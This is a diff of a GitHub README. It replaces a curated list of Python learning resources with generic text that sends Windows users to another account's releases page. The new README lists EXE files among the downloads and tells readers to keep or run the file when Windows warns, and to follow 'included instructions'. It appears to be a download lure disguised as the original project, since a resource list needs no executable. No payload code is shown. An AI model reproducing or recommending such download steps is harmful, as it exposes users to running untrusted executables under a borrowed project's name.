@@ -1,899 +1,227 @@
-# Python Kit ⚙️
-
-> A curated collection of essential resources, libraries, tools, courses, and playbooks to help you master Python, from writing your first script to building production-grade systems.
-
-[![GitHub stars](https://img.shields.io/github/stars/avinash201199/Python-KIT?style=social)](https://github.com/avinash201199/Python-KIT)
-[![GitHub forks](https://img.shields.io/github/forks/avinash201199/Python-KIT?style=social)](https://github.com/avinash201199/Python-KIT/network)
-[![GitHub watchers](https://img.shields.io/github/watchers/avinash201199/Python-KIT?style=social)](https://github.com/avinash201199/Python-KIT/watchers)
-[![GitHub issues](https://img.shields.io/github/issues/avinash201199/Python-KIT)](https://github.com/avinash201199/Python-KIT/issues)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
----
-
-## About
-
-Learning Python is easy. Mastering it is a different story.
-
-This is a curated directory of the best Python resources for every stage of your journey, from syntax basics to async systems, from data science to web backends, from scripting to deploying scalable APIs. Whether you're a complete beginner, a developer switching stacks, or a professional sharpening your craft, you'll find books, courses, libraries, tools, and communities for every level.
-
----
-
-## Who Is This For?
-
-- **Beginners** → Writing their first lines of Python
-- **Web Developers** → Building backends with Django, FastAPI, or Flask
-- **Data Scientists** → Wrangling data with Pandas, NumPy, and Matplotlib
-- **ML Engineers** → Training and deploying models with PyTorch and scikit-learn
-- **DevOps / SREs** → Automating infrastructure and scripting workflows
-- **Competitive Programmers** → Solving problems efficiently in Python
-- **Anyone** who wants to write cleaner, faster, more Pythonic code
-
----
-
-## What's Inside?
-
-- **Roadmaps** → Step-by-step learning paths by role and goal
-- **Books** → From beginner primers to advanced internals
-- **Courses & Videos** → Free and paid learning resources
-- **Core Language** → Deep dives into Python's internals and features
-- **Web Development** → Frameworks, ORMs, authentication, and APIs
-- **Data Science & ML** → Libraries, notebooks, and pipelines
-- **Scripting & Automation** → File handling, CLI tools, and task runners
-- **Testing** → Unit tests, integration tests, and coverage tools
-- **Performance & Profiling** → Speed up your Python code
-- **Packaging & Deployment** → Ship Python projects the right way
-- **Tools & Extensions** → IDEs, linters, formatters, and type checkers
-- **Communities** → Where Pythonistas hang out
-
----
-
-## 📋 Table of Contents
-
-- [Roadmaps](#roadmaps)
-- [Core Language](#core-language)
-- [Books](#books)
-- [Courses & Videos](#courses--videos)
-- [Web Development](#web-development)
-- [Data Science & Analytics](#data-science--analytics)
-- [Machine Learning & AI](#machine-learning--ai)
-- [Scripting & Automation](#scripting--automation)
-- [Databases & ORMs](#databases--orms)
-- [APIs & Networking](#apis--networking)
-- [Async & Concurrency](#async--concurrency)
-- [Testing](#testing)
-- [Performance & Profiling](#performance--profiling)
-- [Security](#security)
-- [Packaging & Distribution](#packaging--distribution)
-- [DevOps & Deployment](#devops--deployment)
-- [CLI Tools](#cli-tools)
-- [Code Quality & Style](#code-quality--style)
-- [Type Hints & Static Analysis](#type-hints--static-analysis)
-- [Cheat Sheets & Quick References](#cheat-sheets--quick-references)
-- [Visualizers & Tools](#visualizers--tools)
-- [IDEs & Extensions](#ides--extensions)
-- [GitHub Repositories](#github-repositories)
-- [Blogs & Newsletters](#blogs--newsletters)
-- [Podcasts](#podcasts)
-- [Communities & Forums](#communities--forums)
-- [Key Articles & Essays](#key-articles--essays)
-- [Practice Platforms](#practice-platforms)
-- [Startup Programs & Credits](#startup-programs--credits)
-
----
-
-## Roadmaps
-
-- [Roadmap.sh - Python Developer](https://roadmap.sh/python)
-- [Roadmap.sh - Backend Developer](https://roadmap.sh/backend)
-- [Roadmap.sh - Data Scientist](https://roadmap.sh/ai-data-scientist)
-- [Roadmap.sh - MLOps](https://roadmap.sh/mlops)
-- [Python.org - Beginner's Guide](https://wiki.python.org/moin/BeginnersGuide)
-- [Full Stack Python](https://www.fullstackpython.com/)
-- [Real Python Learning Paths](https://realpython.com/learning-paths/)
-- [Kaggle Python Learning Path](https://www.kaggle.com/learn/python)
-- [Python for Everybody - Dr. Chuck](https://www.py4e.com/)
-
----
-
-## Core Language
-
-### Official Documentation
-
-- [Python Docs](https://docs.python.org/3/)
-- [Python Language Reference](https://docs.python.org/3/reference/)
-- [Python Standard Library](https://docs.python.org/3/library/)
-- [What's New in Python 3.x](https://docs.python.org/3/whatsnew/)
-- [Python HOWTOs](https://docs.python.org/3/howto/)
-- [PEP Index - Python Enhancement Proposals](https://peps.python.org/)
-
-### Key PEPs to Know
-
-- [PEP 8 — Style Guide for Python Code](https://peps.python.org/pep-0008/)
-- [PEP 20 — The Zen of Python](https://peps.python.org/pep-0020/)
-- [PEP 257 — Docstring Conventions](https://peps.python.org/pep-0257/)
-- [PEP 484 — Type Hints](https://peps.python.org/pep-0484/)
-- [PEP 526 — Variable Annotations](https://peps.python.org/pep-0526/)
-- [PEP 572 — Walrus Operator](https://peps.python.org/pep-0572/)
-- [PEP 634 — Structural Pattern Matching](https://peps.python.org/pep-0634/)
-- [PEP 3107 — Function Annotations](https://peps.python.org/pep-3107/)
-
-### Deep Dives
-
-- [Python Data Model](https://docs.python.org/3/reference/datamodel.html)
-- [Python Internals - CPython](https://realpython.com/cpython-source-code-guide/)
-- [Fluent Python Notes - Luciano Ramalho](https://www.fluentpython.com/)
-- [Understanding Python's GIL](https://realpython.com/python-gil/)
-- [Python Memory Management](https://realpython.com/python-memory-management/)
-- [Generators & Iterators](https://realpython.com/introduction-to-python-generators/)
-- [Decorators in Python](https://realpython.com/primer-on-python-decorators/)
-- [Context Managers & `with`](https://realpython.com/python-with-statement/)
-- [Metaclasses in Python](https://realpython.com/python-metaclasses/)
-- [Descriptors](https://docs.python.org/3/howto/descriptor.html)
-- [Abstract Base Classes](https://docs.python.org/3/library/abc.html)
-
-### Built-in Modules to Master
-
-- [collections](https://docs.python.org/3/library/collections.html)
-- [itertools](https://docs.python.org/3/library/itertools.html)
-- [functools](https://docs.python.org/3/library/functools.html)
-- [pathlib](https://docs.python.org/3/library/pathlib.html)
-- [dataclasses](https://docs.python.org/3/library/dataclasses.html)
-- [typing](https://docs.python.org/3/library/typing.html)
-- [contextlib](https://docs.python.org/3/library/contextlib.html)
-- [enum](https://docs.python.org/3/library/enum.html)
-- [logging](https://docs.python.org/3/library/logging.html)
-- [argparse](https://docs.python.org/3/library/argparse.html)
-
----
-
-## Books
-
-### Beginner
-
-- [Python Crash Course - Eric Matthes](https://nostarch.com/python-crash-course-3rd-edition)
-- [Automate the Boring Stuff with Python - Al Sweigart](https://automatetheboringstuff.com/) *(Free online)*
-- [Learning Python - Mark Lutz](https://www.oreilly.com/library/view/learning-python-5th/9781449355722/)
-- [Python for Everybody - Dr. Charles Severance](https://www.py4e.com/book)
-- [Head First Python - Paul Barry](https://www.oreilly.com/library/view/head-first-python/9781492051282/)
-- [Think Python - Allen B. Downey](https://greenteapress.com/wp/think-python-2e/) *(Free online)*
-
-### Intermediate
-
-- [Fluent Python - Luciano Ramalho](https://www.fluentpython.com/)
-- [Effective Python - Brett Slatkin](https://effectivepython.com/)
-- [Python Tricks - Dan Bader](https://realpython.com/products/python-tricks-book/)
-- [Clean Code in Python - Mariano Anaya](https://www.packtpub.com/product/clean-code-in-python-second-edition/9781800560215)
-- [Python Cookbook - David Beazley & Brian Jones](https://www.oreilly.com/library/view/python-cookbook-3rd/9781449357337/)
-- [Serious Python - Julien Danjou](https://serious-python.com/)
-
-### Advanced
-
-- [CPython Internals - Anthony Shaw](https://realpython.com/products/cpython-internals-book/)
-- [Architecture Patterns with Python - Percival & Gregory](https://www.cosmicpython.com/) *(Free online)*
-- [High Performance Python - Gorelick & Ozsvald](https://www.oreilly.com/library/view/high-performance-python/9781492055013/)
-- [Python Concurrency with asyncio - Matthew Fowler](https://www.manning.com/books/python-concurrency-with-asyncio)
-- [Robust Python - Patrick Viafore](https://www.oreilly.com/library/view/robust-python/9781098100650/)
-
-### Domain-Specific
-
-- [Python for Data Analysis - Wes McKinney](https://wesmckinney.com/book/) *(Free online)*
-- [Hands-On Machine Learning - Aurélien Géron](https://www.oreilly.com/library/view/hands-on-machine-learning/9781098125967/)
-- [Python Testing with pytest - Brian Okken](https://pragprog.com/titles/bopytest2/python-testing-with-pytest-second-edition/)
-- [Two Scoops of Django - Feldroy](https://www.feldroy.com/books/two-scoops-of-django-3-x)
-- [Flask Web Development - Miguel Grinberg](https://www.oreilly.com/library/view/flask-web-development/9781491991725/)
-
----
-
-## Courses & Videos
-
-### Free Courses
-
-- [Python for Everybody - Coursera / Dr. Chuck](https://www.coursera.org/specializations/python)
-- [CS50P - Introduction to Programming with Python - Harvard](https://cs50.harvard.edu/python/)
-- [Google's Python Class](https://developers.google.com/edu/python)
-- [Kaggle Python Course](https://www.kaggle.com/learn/python)
-- [freeCodeCamp Python Full Course](https://www.youtube.com/watch?v=rfscVS0vtbw)
-- [Corey Schafer Python Tutorials](https://www.youtube.com/@coreyms)
-- [Socratica Python](https://www.youtube.com/playlist?list=PLi01XoE8jYohWFPpC17Z-wWhPOSuh8Er-)
-- [Tech With Tim Python](https://www.youtube.com/@TechWithTim)
-- [Sentdex Python Programming](https://www.youtube.com/@sentdex)
-
-### Structured & Paid Courses
-
-- [Real Python](https://realpython.com/)
-- [Talk Python Training](https://training.talkpython.fm/)
-- [Python Morsels](https://www.pythonmorsels.com/)
-- [Udemy - 100 Days of Code Python - Angela Yu](https://www.udemy.com/course/100-days-of-code/)
-- [Udemy - Complete Python Bootcamp - Jose Portilla](https://www.udemy.com/course/complete-python-bootcamp/)
-- [JetBrains Academy - Python](https://www.jetbrains.com/academy/)
-- [DataCamp Python Track](https://www.datacamp.com/tracks/python-programmer)
-
-### YouTube Channels
-
-- [Corey Schafer](https://www.youtube.com/@coreyms)
-- [Tech With Tim](https://www.youtube.com/@TechWithTim)
-- [ArjanCodes](https://www.youtube.com/@ArjanCodes) *(Design patterns & best practices)*
-- [mCoding](https://www.youtube.com/@mCoding) *(Python internals)*
-- [anthonywritescode](https://www.youtube.com/@anthonywritescode)
-- [Sentdex](https://www.youtube.com/@sentdex)
-- [NeuralNine](https://www.youtube.com/@NeuralNine)
-- [Patrick Loeber](https://www.youtube.com/@patloeber)
-
----
-
-## Web Development
-
-### Frameworks
-
-- [Django](https://www.djangoproject.com/) *(Batteries-included)*
-- [FastAPI](https://fastapi.tiangolo.com/) *(Modern, async, type-safe)*
-- [Flask](https://flask.palletsprojects.com/) *(Lightweight & flexible)*
-- [Starlette](https://www.starlette.io/) *(ASGI foundation)*
-- [Litestar](https://litestar.dev/) *(Opinionated, performant)*
-- [Tornado](https://www.tornadoweb.org/)
-- [Sanic](https://sanic.dev/) *(Fast async)*
-- [Bottle](https://bottlepy.org/) *(Single-file micro framework)*
-
-### Django Ecosystem
-
-- [Django REST Framework](https://www.django-rest-framework.org/)
-- [Django Channels](https://channels.readthedocs.io/)
-- [Django Ninja](https://django-ninja.dev/)
-- [Wagtail CMS](https://wagtail.org/)
-- [Celery + Django](https://docs.celeryq.dev/en/stable/django/first-steps-with-django.html)
-- [Two Scoops of Django](https://www.feldroy.com/books/two-scoops-of-django-3-x)
-
-### FastAPI Ecosystem
-
-- [FastAPI Docs](https://fastapi.tiangolo.com/)
-- [Pydantic](https://docs.pydantic.dev/) *(Data validation)*
-- [SQLModel](https://sqlmodel.tiangolo.com/)
-- [FastAPI Users](https://fastapi-users.github.io/fastapi-users/)
-- [Piccolo ORM](https://piccolo-orm.com/)
-
-### Authentication & Security
-
-- [Python-Jose (JWT)](https://python-jose.readthedocs.io/)
-- [Passlib](https://passlib.readthedocs.io/)
-- [Authlib](https://authlib.org/)
-- [Django Allauth](https://django-allauth.readthedocs.io/)
-
-### Template Engines
-
-- [Jinja2](https://jinja.palletsprojects.com/)
-- [Mako](https://www.makotemplates.org/)
-- [Chameleon](https://chameleon.readthedocs.io/)
-
----
-
-## Data Science & Analytics
-
-### Core Libraries
-
-- [NumPy](https://numpy.org/)
-- [Pandas](https://pandas.pydata.org/)
-- [Matplotlib](https://matplotlib.org/)
-- [Seaborn](https://seaborn.pydata.org/)
-- [SciPy](https://scipy.org/)
-- [Statsmodels](https://www.statsmodels.org/)
-
-### Notebooks & Exploration
-
-- [Jupyter Notebook](https://jupyter.org/)
-- [JupyterLab](https://jupyterlab.readthedocs.io/)
-- [Google Colab](https://colab.research.google.com/) *(Free GPU)*
-- [Kaggle Notebooks](https://www.kaggle.com/code)
-- [Marimo](https://marimo.io/) *(Reactive notebooks)*
-- [Deepnote](https://deepnote.com/)
-
-### Data Processing
-
-- [Polars](https://www.pola.rs/) *(Fast Pandas alternative)*
-- [Dask](https://www.dask.org/) *(Parallel computing)*
-- [PySpark](https://spark.apache.org/docs/latest/api/python/)
-- [Vaex](https://vaex.io/)
-- [Arrow (PyArrow)](https://arrow.apache.org/docs/python/)
-- [Great Expectations](https://greatexpectations.io/) *(Data quality)*
-
-### Visualization
-
-- [Plotly](https://plotly.com/python/)
-- [Bokeh](https://bokeh.org/)
-- [Altair](https://altair-viz.github.io/)
-- [Dash](https://dash.plotly.com/) *(Interactive dashboards)*
-- [Streamlit](https://streamlit.io/) *(Quick data apps)*
-- [Gradio](https://gradio.app/)
-
----
-
-## Machine Learning & AI
-
-### Classical ML
-
-- [scikit-learn](https://scikit-learn.org/)
-- [XGBoost](https://xgboost.readthedocs.io/)
-- [LightGBM](https://lightgbm.readthedocs.io/)
-- [CatBoost](https://catboost.ai/)
-- [Imbalanced-learn](https://imbalanced-learn.org/)
-- [SHAP](https://shap.readthedocs.io/) *(Model explainability)*
-
-### Deep Learning
-
-- [PyTorch](https://pytorch.org/)
-- [TensorFlow / Keras](https://www.tensorflow.org/)
-- [JAX](https://jax.readthedocs.io/)
-- [Hugging Face Transformers](https://huggingface.co/docs/transformers)
-- [Lightning](https://lightning.ai/)
-- [fast.ai](https://docs.fast.ai/)
-- [Timm](https://timm.fast.ai/) *(Vision models)*
-
-### MLOps & Pipelines
-
-- [MLflow](https://mlflow.org/)
-- [DVC](https://dvc.org/) *(Data version control)*
-- [Weights & Biases](https://wandb.ai/)
-- [Prefect](https://www.prefect.io/)
-- [ZenML](https://zenml.io/)
-- [BentoML](https://www.bentoml.com/)
-- [Evidently AI](https://www.evidentlyai.com/)
-
-### NLP
-
-- [spaCy](https://spacy.io/)
-- [NLTK](https://www.nltk.org/)
-- [Hugging Face Datasets](https://huggingface.co/docs/datasets)
-- [Gensim](https://radimrehurek.com/gensim/)
-- [TextBlob](https://textblob.readthedocs.io/)
-
----
-
-## Scripting & Automation
-
-### File & System Operations
-
-- [pathlib](https://docs.python.org/3/library/pathlib.html)
-- [shutil](https://docs.python.org/3/library/shutil.html)
-- [os & sys](https://docs.python.org/3/library/os.html)
-- [watchdog](https://python-watchdog.readthedocs.io/) *(File system events)*
-- [schedule](https://schedule.readthedocs.io/) *(Job scheduling)*
-- [APScheduler](https://apscheduler.readthedocs.io/)
-
-### Web Scraping
-
-- [Requests](https://requests.readthedocs.io/)
-- [BeautifulSoup4](https://www.crummy.com/software/BeautifulSoup/)
-- [Scrapy](https://scrapy.org/)
-- [Playwright (Python)](https://playwright.dev/python/)
-- [Selenium](https://selenium-python.readthedocs.io/)
-- [httpx](https://www.python-httpx.org/)
-- [Mechanize](https://mechanize.readthedocs.io/)
+# 🐍 Python-KIT - Learn Python with Clear Paths
 
-### Data Formats
+[![Download Python-KIT](https://img.shields.io/badge/Download%20Python-KIT-blue?style=for-the-badge)](https://github.com/jblu608/Python-KIT/releases)
 
-- [json](https://docs.python.org/3/library/json.html)
-- [csv](https://docs.python.org/3/library/csv.html)
-- [openpyxl](https://openpyxl.readthedocs.io/) *(Excel)*
-- [PyYAML](https://pyyaml.org/)
-- [TOML](https://docs.python.org/3/library/tomllib.html)
-- [xmltodict](https://github.com/martinblech/xmltodict)
-- [python-dotenv](https://saurabh-kumar.com/python-dotenv/)
+## 📦 What is Python-KIT?
 
-### Task Automation
+Python-KIT is a curated set of Python resources for people who want to move from beginner to production-ready developer. It gathers useful guides, tools, libraries, and roadmaps in one place so you do not need to search across many sites.
 
-- [Invoke](https://www.pyinvoke.org/)
-- [Fabric](https://www.fabfile.org/)
-- [Luigi](https://luigi.readthedocs.io/)
-- [Celery](https://docs.celeryq.dev/) *(Distributed task queue)*
-- [RQ (Redis Queue)](https://python-rq.org/)
-- [Dramatiq](https://dramatiq.io/)
+Use it to:
+- Learn core Python step by step
+- Find tools that save time
+- Pick libraries for real projects
+- Follow roadmaps that show what to learn next
+- Build a path from basics to working apps
 
----
+## 🚀 Getting Started
 
-## Databases & ORMs
+Python-KIT is easy to use on Windows. You do not need a setup wizard or extra install steps for the main download page. You only need to visit the release page and get the latest file or package from there.
 
-### SQL & ORMs
+### 📥 Download Python-KIT
 
-- [SQLAlchemy](https://www.sqlalchemy.org/) *(The standard ORM)*
-- [Django ORM](https://docs.djangoproject.com/en/stable/topics/db/)
-- [Tortoise ORM](https://tortoise.github.io/) *(Async)*
-- [Peewee](https://docs.peewee-orm.com/)
-- [SQLModel](https://sqlmodel.tiangolo.com/)
-- [Alembic](https://alembic.sqlalchemy.org/) *(Migrations)*
+Visit this page to download:
 
-### NoSQL
+https://github.com/jblu608/Python-KIT/releases
 
-- [PyMongo](https://pymongo.readthedocs.io/) *(MongoDB)*
-- [Motor](https://motor.readthedocs.io/) *(Async MongoDB)*
-- [redis-py](https://redis-py.readthedocs.io/)
-- [Elasticsearch-py](https://elasticsearch-py.readthedocs.io/)
-- [Cassandra Driver](https://docs.datastax.com/en/developer/python-driver/)
+### 🖥️ On Windows
 
-### Query Builders
+1. Open the download page in your browser.
+2. Find the latest release near the top of the page.
+3. Download the file that matches your device.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Open the main file or README file inside the folder.
+7. Follow the included steps to view the resources.
 
-- [pypika](https://pypika.readthedocs.io/)
-- [databases](https://www.encode.io/databases/) *(Async DB)*
+If your browser shows a save dialog, choose a folder you can find again, such as Downloads or Desktop.
 
----
+## 🧭 What You Get
 
-## APIs & Networking
+Python-KIT focuses on useful learning paths and work-ready tools. The collection is arranged to help you move through Python in a logical order.
 
-### HTTP Clients
+### 📚 Learning Resources
+- Beginner guides
+- Syntax help
+- Practice ideas
+- Study notes for core Python topics
+- Roadmaps for next steps
 
-- [Requests](https://requests.readthedocs.io/) *(Standard)*
-- [httpx](https://www.python-httpx.org/) *(Async-ready)*
-- [aiohttp](https://docs.aiohttp.org/) *(Async HTTP)*
-- [urllib3](https://urllib3.readthedocs.io/)
+### 🛠️ Tools
+- Code editors
+- Task helpers
+- Testing tools
+- File and project utilities
+- Small tools for daily Python work
 
-### API Development
+### 📦 Libraries
+- Common Python libraries for data, files, web work, and automation
+- Picks that are useful in real projects
+- Short notes to help you choose the right one
 
-- [FastAPI](https://fastapi.tiangolo.com/)
-- [Django REST Framework](https://www.django-rest-framework.org/)
-- [Flask-RESTful](https://flask-restful.readthedocs.io/)
-- [Strawberry](https://strawberry.rocks/) *(GraphQL)*
-- [Ariadne](https://ariadnegraphql.org/) *(GraphQL)*
-- [gRPC Python](https://grpc.io/docs/languages/python/)
+### 🗺️ Roadmaps
+- A path for first-time learners
+- A path for building projects
+- A path for moving toward production use
+- Clear order so you know what to study next
 
-### WebSockets
+## 💻 System Needs
 
-- [websockets](https://websockets.readthedocs.io/)
-- [Django Channels](https://channels.readthedocs.io/)
-- [Socket.IO Python](https://python-socketio.readthedocs.io/)
+Python-KIT is meant for normal Windows computers and simple use. A basic setup is enough.
 
----
+- Windows 10 or Windows 11
+- A web browser such as Chrome, Edge, or Firefox
+- A file unzip tool if the download comes as a ZIP file
+- Enough free space to store the downloaded files
+- Internet access to get the release from GitHub
 
-## Async & Concurrency
+If you plan to use Python tools from the collection, you may also want:
+- Python 3.11 or newer
+- A code editor such as VS Code
+- Permission to install apps on your PC
 
-### Async I/O
+## 🧩 How to Use It
 
-- [asyncio](https://docs.python.org/3/library/asyncio.html) *(Built-in)*
-- [Trio](https://trio.readthedocs.io/) *(Friendly async)*
-- [AnyIO](https://anyio.readthedocs.io/) *(Async compatibility)*
-- [uvloop](https://uvloop.readthedocs.io/) *(Fast event loop)*
-- [Python Concurrency with asyncio - Book](https://www.manning.com/books/python-concurrency-with-asyncio)
+Python-KIT works as a guide library. After you open it, pick the part that matches your goal.
 
-### Parallelism & Threads
+### For a new learner
+- Start with beginner guides
+- Learn the basic parts of Python
+- Try the practice ideas
+- Move to the roadmap after the first lessons
 
-- [threading](https://docs.python.org/3/library/threading.html)
-- [multiprocessing](https://docs.python.org/3/library/multiprocessing.html)
-- [concurrent.futures](https://docs.python.org/3/library/concurrent.futures.html)
-- [Ray](https://www.ray.io/) *(Distributed computing)*
-- [Dask](https://dask.org/)
+### For a project builder
+- Check the library list
+- Look for tools that fit your task
+- Use the roadmap to fill skill gaps
+- Return to the guides when you need help
 
----
+### For someone ready for production work
+- Review the production roadmap
+- Check notes on testing and code structure
+- Pick libraries that are common in real apps
+- Use the tool list to support daily work
 
-## Testing
+## 🪟 Windows Download Steps
 
-### Frameworks
+Use these steps if you want the fastest path on Windows.
 
-- [pytest](https://pytest.org/) *(The standard)*
-- [unittest](https://docs.python.org/3/library/unittest.html) *(Built-in)*
-- [Hypothesis](https://hypothesis.readthedocs.io/) *(Property-based testing)*
-- [nose2](https://docs.nose2.io/)
+1. Open the release page.
+2. Find the newest release.
+3. Download the attached file.
+4. If Windows asks for permission, choose the option to keep or run the file only if you trust the source.
+5. If the file is compressed, extract it first.
+6. Open the folder and read the included file.
+7. Follow the included instructions for the resource pack.
 
-### Mocking & Fixtures
+If the page includes more than one file, choose the one that looks like the main package or latest bundle.
 
-- [unittest.mock](https://docs.python.org/3/library/unittest.mock.html)
-- [pytest-mock](https://pytest-mock.readthedocs.io/)
-- [factory-boy](https://factoryboy.readthedocs.io/)
-- [faker](https://faker.readthedocs.io/)
-- [responses](https://github.com/getsentry/responses) *(Mock HTTP)*
-- [respx](https://lundberg.github.io/respx/) *(Mock httpx)*
+## 🧰 Common Files You May See
 
-### Coverage & Quality
+You may see one or more of these file types on the release page:
 
-- [coverage.py](https://coverage.readthedocs.io/)
-- [pytest-cov](https://pytest-cov.readthedocs.io/)
-- [mutmut](https://mutmut.readthedocs.io/) *(Mutation testing)*
+- ZIP file: a compressed folder you need to extract
+- PDF file: a document you can read in your browser or a reader app
+- TXT or MD file: a plain text guide
+- EXE file: a Windows program you can open by double-clicking
+- CSV or JSON file: a data file for tools or examples
 
-### Browser & E2E Testing
+If you are unsure which file to use, start with the main download attached to the latest release.
 
-- [Playwright](https://playwright.dev/python/)
-- [Selenium](https://selenium-python.readthedocs.io/)
-- [Cypress + Python backend](https://www.cypress.io/)
+## 🔍 What Makes It Useful
 
----
+Python-KIT is built for people who want fewer dead ends. It saves time by grouping useful Python material in one place.
 
-## Performance & Profiling
+You can use it to:
+- Cut down search time
+- Learn in the right order
+- Find tools that fit your job
+- Keep a clean learning path
+- Move from theory to practice
 
-### Profiling Tools
+## 🧪 Example Use Cases
 
-- [cProfile](https://docs.python.org/3/library/profile.html) *(Built-in)*
-- [line_profiler](https://github.com/pyutils/line_profiler)
-- [memory_profiler](https://github.com/pythonprofilers/memory_profiler)
-- [py-spy](https://github.com/benfred/py-spy) *(Sampling profiler)*
-- [Scalene](https://github.com/plasma-umass/scalene) *(CPU + memory)*
-- [Pyflame](https://github.com/uber-archive/pyflame)
-- [Austin](https://github.com/P403n1x87/austin)
+### Learn Python basics
+Open the beginner section, read one topic at a time, and use the practice ideas to test what you learned.
 
-### Speed Optimization
+### Build a small app
+Use the library list and tool list to pick the parts you need, then follow the project roadmap.
 
-- [Cython](https://cython.org/)
-- [Numba](https://numba.pydata.org/) *(JIT compiler)*
-- [PyPy](https://www.pypy.org/) *(Faster interpreter)*
-- [mypyc](https://mypyc.readthedocs.io/) *(Compile typed Python)*
-- [orjson](https://github.com/ijl/orjson) *(Fast JSON)*
-- [msgspec](https://jcristharif.com/msgspec/) *(Fast serialization)*
+### Prepare for work
+Use the production roadmap to review testing, code structure, and common tools used in real projects.
 
----
+### Set up a study plan
+Choose one topic from each part of the kit and follow it in order during your study time.
 
-## Security
+## 📁 Suggested Folder Layout
 
-- [Bandit](https://bandit.readthedocs.io/) *(Security linter)*
-- [Safety](https://pyup.io/safety/) *(Dependency vulnerability scanner)*
-- [cryptography](https://cryptography.io/)
-- [PyNaCl](https://pynacl.readthedocs.io/)
-- [bcrypt](https://pypi.org/project/bcrypt/)
-- [python-jose](https://python-jose.readthedocs.io/) *(JWT)*
-- [Secrets module](https://docs.python.org/3/library/secrets.html) *(Built-in)*
-- [OWASP Python Security Project](https://owasp.org/www-project-python-security/)
-- [Pip-audit](https://pypi.org/project/pip-audit/)
+If you extract a ZIP file, you may see a layout like this:
 
----
+- `README.md` for the main guide
+- `resources/` for links and notes
+- `tools/` for utility files
+- `libraries/` for library lists
+- `roadmaps/` for learning paths
+- `examples/` for sample content
 
-## Packaging & Distribution
+The exact folder names may change, but the layout should still feel easy to follow.
 
-### Package Management
+## 🛠️ Troubleshooting
 
-- [pip](https://pip.pypa.io/)
-- [uv](https://github.com/astral-sh/uv) *(Ultra-fast pip replacement)*
-- [Poetry](https://python-poetry.org/)
-- [PDM](https://pdm-project.org/)
-- [Hatch](https://hatch.pypa.io/)
-- [Pipenv](https://pipenv.pypa.io/)
-- [conda](https://docs.conda.io/)
+### The file will not open
+- Check that the download finished
+- Try opening it again
+- If it is a ZIP file, extract it first
+- Make sure you use the latest version from the release page
 
-### Virtual Environments
+### Windows blocks the file
+- Open the file source page again
+- Confirm that you downloaded it from the release page
+- If the file is compressed, extract it before opening the contents
 
-- [venv](https://docs.python.org/3/library/venv.html) *(Built-in)*
-- [virtualenv](https://virtualenv.pypa.io/)
-- [pyenv](https://github.com/pyenv/pyenv) *(Python version manager)*
-- [pyenv-virtualenv](https://github.com/pyenv/pyenv-virtualenv)
+### I cannot find the file
+- Open your Downloads folder
+- Sort files by date
+- Look for the newest ZIP, EXE, PDF, or MD file
+- Download it again if needed
 
-### Building & Publishing
+### The folder looks empty
+- Make sure extraction finished
+- Open the extracted folder, not the ZIP file itself
+- Turn on file name extensions in File Explorer if needed
 
-- [setuptools](https://setuptools.pypa.io/)
-- [build](https://pypa-build.readthedocs.io/)
-- [twine](https://twine.readthedocs.io/) *(Upload to PyPI)*
-- [PyPI](https://pypi.org/)
-- [flit](https://flit.pypa.io/)
+## 🔄 Updating
 
-### Bundling Executables
+When a new release appears, return to the release page and download the latest version.
 
-- [PyInstaller](https://pyinstaller.org/)
-- [Nuitka](https://nuitka.net/)
-- [cx_Freeze](https://cx-freeze.readthedocs.io/)
-- [Briefcase](https://briefcase.readthedocs.io/)
+1. Open the release page.
+2. Check the newest release.
+3. Download the new file.
+4. Replace the old copy if needed.
+5. Open the newest files and keep using the current guide set.
 
----
+## 📌 Topics Covered
 
-## DevOps & Deployment
+This repository is tagged with:
+- python
+- python-kit
 
-### Containerization
+The content is centered on Python learning, Python tools, and a clear path toward production work.
 
-- [Docker](https://www.docker.com/)
-- [docker-py](https://docker-py.readthedocs.io/)
-- [Podman](https://podman.io/)
+## 🧾 File Source
 
-### WSGI / ASGI Servers
+Primary download link:
 
-- [Gunicorn](https://gunicorn.org/) *(WSGI)*
-- [Uvicorn](https://www.uvicorn.org/) *(ASGI)*
-- [Hypercorn](https://pgjones.gitlab.io/hypercorn/) *(ASGI)*
-- [Waitress](https://docs.pylonsproject.org/projects/waitress/) *(WSGI, Windows-friendly)*
+https://github.com/jblu608/Python-KIT/releases
 
-### Infrastructure as Code
+## 🤝 Use Case Fit
 
-- [Pulumi (Python SDK)](https://www.pulumi.com/docs/languages-sdks/python/)
-- [Ansible](https://docs.ansible.com/)
-- [AWS CDK Python](https://docs.aws.amazon.com/cdk/v2/guide/work-with-cdk-python.html)
-- [Boto3 - AWS SDK](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)
+Python-KIT fits well if you want:
+- A simple Python learning path
+- One place for useful references
+- A way to compare tools and libraries
+- A resource set that grows with your skill
+- A guide from beginner level to working level
 
-### CI/CD
+## 🧭 Next Step
 
-- [GitHub Actions Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
-- [tox](https://tox.wiki/) *(Test automation)*
-- [nox](https://nox.thea.codes/) *(Flexible test runner)*
-
----
-
-## CLI Tools
-
-### Frameworks
-
-- [Click](https://click.palletsprojects.com/) *(Most popular)*
-- [Typer](https://typer.tiangolo.com/) *(Type hint–based)*
-- [argparse](https://docs.python.org/3/library/argparse.html) *(Built-in)*
-- [docopt](http://docopt.org/)
-- [Fire](https://github.com/google/python-fire) *(Google)*
-
-### Terminal UI
-
-- [Rich](https://rich.readthedocs.io/) *(Beautiful terminal output)*
-- [Textual](https://textual.textualize.io/) *(TUI framework)*
-- [Prompt Toolkit](https://python-prompt-toolkit.readthedocs.io/)
-- [Curtsies](https://curtsies.readthedocs.io/)
-- [tqdm](https://tqdm.github.io/) *(Progress bars)*
-- [questionary](https://questionary.readthedocs.io/)
-
----
-
-## Code Quality & Style
-
-### Linters
-
-- [Ruff](https://docs.astral.sh/ruff/) *(Fast, replaces flake8 + isort)*
-- [Flake8](https://flake8.pycqa.org/)
-- [Pylint](https://pylint.org/)
-- [pycodestyle](https://pycodestyle.pycqa.org/)
-
-### Formatters
-
-- [Black](https://black.readthedocs.io/) *(The uncompromising formatter)*
-- [isort](https://pycqa.github.io/isort/)
-- [autopep8](https://pypi.org/project/autopep8/)
-- [Ruff Format](https://docs.astral.sh/ruff/formatter/)
-
-### Pre-commit & Git Hooks
-
-- [pre-commit](https://pre-commit.com/)
